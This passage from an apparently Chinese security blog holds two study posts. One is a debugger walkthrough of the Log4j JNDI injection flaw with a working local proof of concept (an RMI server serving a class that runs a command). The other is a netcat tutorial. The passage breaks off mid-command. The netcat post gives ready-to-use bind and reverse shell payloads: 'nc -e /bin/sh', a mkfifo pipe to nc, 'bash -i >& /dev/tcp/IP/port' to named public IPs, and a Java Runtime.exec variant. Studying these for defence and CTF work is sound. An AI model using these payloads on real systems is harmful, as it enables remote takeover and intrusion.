class="hljs-string">&quot;$&#123;java:version&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232986.jpg" alt="image-20221002153617894"></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>组件中lookup功能的实现类JndiLookup的设计缺陷导致，这个类是在Log4j-core-xxx.jar，所以这个漏洞和Log4j-core有关</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232662.jpg" alt="image-20221002153838589"></p><p>在调用lookup方法处打断点</p><p>JNDI lookup的方法调用在InitialContext.java中</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232530.jpg" alt="image-20221002154141225"></p><h3 id="Debug过程"><a href="#Debug过程" class="headerlink" title="Debug过程"></a>Debug过程</h3><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">logger.error(<span class="hljs-string">&quot;野猪热恋$&#123;jndi:ldap://atf6sq.dnslog.cn&#125;&quot;</span>);<br></code></pre></td></tr></table></figure><p>直接传入的就是${}中的内容(没有过滤),也没有传入其他部分</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232515.jpg" alt="image-20221002154417043"></p><p>查看执行链过程,该lookup方法后续在JndiLookup中被调用</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6qzrx5jggj30u204wgm9.jpg" alt="image-20221002154907000"></p><p>过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">JndiLookup.java:<br>var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="hljs-literal">null</span>);<br><br>JndiManager.java:<br><span class="hljs-keyword">public</span> T <span class="hljs-title function_">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.context.lookup(name);<br>&#125;<br><br>Context.java:<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException;<br><br>InitialContext.java<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br><span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>之后处理变量的工作交给了StrSubstitutor这个类</p><p>之后又调用了MessagePatternConverter这个类的format方法</p><ol><li>首先是noLookups这个属性，设置成了false，导致下面代码的执行（现在漏洞修复将这个noLookups设置成true）</li><li>后面的if明显是要定位到<code>$&#123;</code>（并且是连续的），如果有这两个字符就去replace函数替换</li><li>config.getStrSubstitutor()就是上面说的StrSubstitutor</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232226.jpg" alt="image-20221002160354461"></p><blockquote><p>Log4j将要输出的日志拼接成字符串之后，它会去判断字符串中是否包含${和},如果包含了，就会当作变量交给StrSubstitutor这个类去处理。</p></blockquote><p>StrSubstitutor中resolveVariable方法获取${}中字符串</p><p><img src="/../../../../Pictures/%60log4j%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%60/006y8mN6gy1h6r0jtfl7mj31ck05ojt3.jpg" alt="image-20221002161555507"></p><p>可以看到resolver中的内容，可以看到Lookups定义了12种处理类型，如果能匹配到这几种处理类型，就交给它们去处理，其他的都会交给defaultLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232081.jpg" alt="image-20221002161942852"></p><blockquote><p>如果我们的日志内容中有<code>$&#123;jndi:rmi://127.0.0.1:1099/hello&#125;</code>这些内容，去掉${和}传递给resolver的就是<code>jndi:rmi://127.0.0.1:1099/hello</code>。resolver会将第一个”:”之前的内容和lookups做匹配，我们这里获取到的是jndi，就会将剩余部分<code>jndi:rmi://127.0.0.1:1099/hello</code>交给jdni的处理器JndiLookup去处理。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232251.jpg" alt="image-20221002162800611"></p></blockquote><p>传入是信息debug标注，最好用的lookup.lookup也是JNDI的lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232513.jpg" alt="image-20221002162941649"></p><blockquote><p>从而得到了lookup的结果</p></blockquote><h3 id="noLookups相关"><a href="#noLookups相关" class="headerlink" title="noLookups相关"></a>noLookups相关</h3><p>调用formate</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232599.jpg" alt="image-20221002171504977"></p><p>赋值操作（位于 MessagePatternConverter类中）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">int</span> <span class="hljs-variable">noLookupsIdx</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.loadNoLookups(options);<br>        <span class="hljs-built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">loadNoLookups</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] options)</span> &#123;<br>        <span class="hljs-keyword">if</span> (options != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; options.length; ++i) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> options[i];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;nolookups&quot;</span>.equalsIgnoreCase(option)) &#123;<br>                    <span class="hljs-keyword">return</span> i;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于调用 MessagePatternConverter类的format方法 没有传入options且config非空，并且环境变量也没有设置因此noLookups为false</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232069.jpg" alt="image-20221002190435592"></p></blockquote><h3 id="漏洞检测方法"><a href="#漏洞检测方法" class="headerlink" title="漏洞检测方法"></a>漏洞检测方法</h3><p>通过dnslog，还能查看jdk版本是否支持RMI或者ldap服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$&#123;jndi:dns://$&#123;<span class="hljs-keyword">sy</span><span class="hljs-variable">s:java</span>.<span class="hljs-keyword">version</span>&#125;.dnslog/&#125;<br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1、升级到2.17.0版本及以上</p><p>2、参数、环境设置</p><ul><li><p>设置jvm参数：-Dlog4j2.formatMsgNoLookups&#x3D;true，</p></li><li><p>设置系统环境变量：FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS&#x3D;true</p></li></ul><blockquote><p>JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA</p></blockquote><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JDK：11.0.15</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNDI相当于自己做一个服务，如果访问了会直接在放我这本机上执行方法中的代码</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072232104.jpg" alt="image-20221002194642057"></p><h2 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072233648.jpg" alt="tststst"></p><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cui.log4jtest.rmi;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br><br>            System.out.println(<span class="hljs-string">&quot;RMI Listener 1099 port&quot;</span>);<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>            registry.rebind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObj.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObj</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;open a Calculator!&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//这里可以写任意代码，比如木马程序，病毒程序，死循环，后门程序等等。</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>log4jDemo1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4jDemo1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;<br>            logger.info(<span class="hljs-string">&quot;输出的信息是:&#123;&#125;&quot;</span>, str);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>先启动RMIServer再启动log4jDemo1就会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231797.jpg" alt="image-20221002215727110"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231698.jpg" alt="image-20221002215800340"></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nc命令学习及反弹shell细节</title>
    <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
    <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="nc命令学习及反弹shell细节"><a href="#nc命令学习及反弹shell细节" class="headerlink" title="nc命令学习及反弹shell细节"></a>nc命令学习及反弹shell细节</h1><table><thead><tr><th align="left">机器名称</th><th align="left">IP地址</th><th>操作系统</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">🥣</td><td align="left">内网</td><td>Mac os</td></tr></tbody></table><h2 id="nc命令使用"><a href="#nc命令使用" class="headerlink" title="nc命令使用"></a>nc命令使用</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux 默认带的就是这个版本，这个版本的 nc 具有<code>-e</code>选项，十分方便反弹 shell 使用</p></li><li><p><code>netcat-openbsd</code>:ubuntu 里默认的 nc 命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有<code>-e</code>选项。</p></li><li><p><code>ncat</code>:CentOS、Red Hat 默认带的是 ncat。目前ncat已经集成到了 nmap 里面，安装完 nmap 后就可以使用<code>ncat</code>命令了</p></li></ul><blockquote><p>mac上自带nc命令指向的是ncat,linux上nc与ncat没什么区别，mac上最好用ncat,options比较全</p></blockquote><h3 id="前提条件及注意事项"><a href="#前提条件及注意事项" class="headerlink" title="前提条件及注意事项"></a>前提条件及注意事项</h3><ul><li><p>只能nc拥有公网ip的机器，或是在同一局域网下的内网机器(可以nc内网ip)</p></li><li><p>获取本机公网ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl ifconfig.me <br></code></pre></td></tr></table></figure></li><li><p>端口放行：如果是购买了腾讯云服务，要在控制台和宝塔面板同时放行端口(用于TCP连接)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310253657.jpg" alt="image-20220926010406603"></p></li><li><p>需要vps先监听，目标服务器再nc vps，直接nc只能通过udp连接，tcp连接显示拒绝(如果是端口未放行会显示连接超时)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254528.jpg" alt="image-20220926005629905"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254598.jpg" alt="image-20220926005900622"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">未放行端口</span><br>[root@Decemberus ~]# nc 124.223.207.184 3345<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure></li></ul><h3 id="文字交互"><a href="#文字交互" class="headerlink" title="文字交互"></a>文字交互</h3><p><code>-l</code>：使用监听模式，监控传入的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 3344 <span class="hljs-comment"># 监听3344端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254143.jpg" alt="image-20220926004654073"></p><blockquote><p>只是简单的文字交互，相当于聊天工具，对数据编码没有要求，但无法执行系统命令</p></blockquote><h3 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h3><p><code>-e</code>：将传入的信息以命令执行</p><p>将<code>/bin/bash</code>通过 3344 端口来监听，将收到的信息都发送到<code>/bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -l -e /bin/bash 3344<br></code></pre></td></tr></table></figure><blockquote><p><code>/bin/bash</code>是shell解释器，根据目标机器，也可以使用<code>/bin/sh</code>或<code>/bin/zsh</code></p><p>访问端可以通过nc该系统的2333端口，输入端指令会传入该系统的&#x2F;bin&#x2F;bash 执行成功后会返回信息，类似于ssh操作连接来该系统一样</p></blockquote><h3 id="持久监听"><a href="#持久监听" class="headerlink" title="持久监听"></a>持久监听</h3><p><code>-k</code>: 客户端断掉连接时，服务端依然保持运行<br><code>-v</code>：现实指令执行过程细节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -lvk -e  /bin/bash 2333<br></code></pre></td></tr></table></figure><blockquote><p>客户端使用<code>CTRL + c</code>或<code>CTRL + d</code>断开连接的时候，监听端的 ncat 依然在运行，这样方便客户端下次直接 nc 连进来</p></blockquote><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><h4 id="上传文件到远程"><a href="#上传文件到远程" class="headerlink" title="上传文件到远程"></a>上传文件到远程</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &lt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255144.jpg" alt="image-20220926011113841"></p><blockquote><p>此时会将 macOS 的文件传输到远程的 CentOS 服务器上，传输完成后，两个 ncat 会话都将终止。</p></blockquote><h4 id="从远程下载文件"><a href="#从远程下载文件" class="headerlink" title="从远程下载文件"></a>从远程下载文件</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &lt; hello.txt <br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255056.jpg" alt="image-20220926011518092"></p><blockquote><p>这里文件传输完成后不会显示任何内容，并且两个 Ncat 实例将继续工作(但不能文字和命令交互)</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>ncat 不支持端口范围扫描，但是原始的 nc (mac上可以用brew装netcat)可以扫描端口</p><ul><li><h4 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255349.jpg" alt="image-20220926012145161"></p><blockquote><p><code>-n</code>: 直接使用ip地址，而不通过域名服务器<br><code>-z</code>: 使用0输入&#x2F;输出模式%，只在扫描通信端口时使用</p></blockquote></li><li><h4 id="单个扫描"><a href="#单个扫描" class="headerlink" title="单个扫描"></a>单个扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255336.jpg" alt="image-20220926012300304"></p></li></ul><h3 id="vps-nc本机失败可能原因"><a href="#vps-nc本机失败可能原因" class="headerlink" title="vps nc本机失败可能原因"></a>vps nc本机失败可能原因</h3><ul><li><p>本机未监听，tcp连接要让本机先在对应端口监听才能建立，而udp不用，这种情况下一般回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: Connection refused.<br></code></pre></td></tr></table></figure><p>如果使用原始nc，则表现为没有回显，命令直接结束</p></li><li><p>端口未放行:一般回显表现为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: TIMEOUT.<br>或<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure><p>如果使用原始nc则是等待较长时间，命令结束，没有回显</p></li><li><p>使用的本机ip不是公网ip</p></li><li><p>经测试，可能是因为端口未放行，这可能需要配置路由器的防火墙</p></li></ul><h3 id="常见options"><a href="#常见options" class="headerlink" title="常见options"></a>常见options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-l 启动监听<br>-p&lt;端口号&gt; 表示指定端口<br>-v 显示指令执行过程<br>-u udp连接<br>-n 直接使用ip地址，不用域名解析<br>-w&lt;超时秒数&gt;   设置等待连线的时间<br>-z  使用0输入/输出模式，只在扫描通信端口时使用<br></code></pre></td></tr></table></figure><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>vps监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><h3 id="内网弹shell"><a href="#内网弹shell" class="headerlink" title="内网弹shell"></a>内网弹shell</h3><p>ncat的-e 经过简单调整，可以让vps与内网机器进行命令交互</p><p>root@Sloth先监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -lvp 3344<br></code></pre></td></tr></table></figure><p>内网的 macOS 运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -w 10 -e /bin/bash 124.221.124.106 3344<br></code></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc  124.221.124.106 3344 -e /bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255233.jpg" alt="image-20220926013811064"></p><blockquote><p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f ; mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f | <span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | nc x.x.x.x <span class="hljs-number">2333</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><p><img src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg" alt="image-20220927000457356"></p><ul><li><code>rm /tmp/f</code> 删除命令</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> 将&#x2F;bin&#x2F;bash 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li><li><code>cat /tmp/f</code> 将执行结果回显</li></ul></blockquote><h3 id="bash弹shell"><a href="#bash弹shell" class="headerlink" title="bash弹shell"></a>bash弹shell</h3><p>这也是常用的反弹shell payload</p><p>⚠️注意：java命令执行时，会根据空格分割参数。因此最好不要直接传类似下面第二条这种</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1<br>bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #适用sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">适配java的</span><br>String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;<br>Runtime.getRuntime().exec(s);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255967.jpg" alt="image-20220927204310944"></p><table><thead><tr><th>命令</th><th>参数解释</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个 bash 交互环境</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面结合然后一起重定向给后者</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>打开<code>/dev/tcp</code>这个文件就类似于发出了一个socket调用，建立一个socket连接,后面跟目标ip和目标端口</td></tr><tr><td>0&gt;&amp;1</td><td>使得攻击方可以看到输入到命令以及执行结果</td></tr></tbody></table><blockquote><ul><li><p>其实<code>/dev/tcp</code>在根目录下并不存在，之所以能在命令中使用，是因为bash源码对其做了相关预定义</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255199.jpg" alt="image-20220926171832801"></p></li><li><p>如果攻击目标是mac os系统，使用内网弹shell的payload可以成功，bash弹shell的payload可能失败</p><ul><li><p>原因：现在的mac都已经使用zsh作为默认shell，而zsh并没有对<code>/dev/tcp</code>做相关处理，执行payload会回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333<br></code></pre></td></tr></table></figure></li><li><p>如果要使用bash弹shell要先切换当前使用shell，可以<code>sudo su</code>输入当前用户密码切换到root用户，默认使用sh</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256550.jpg" alt="image-20220926172537373"></p></li><li><p>或者更改shell为bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chsh -s 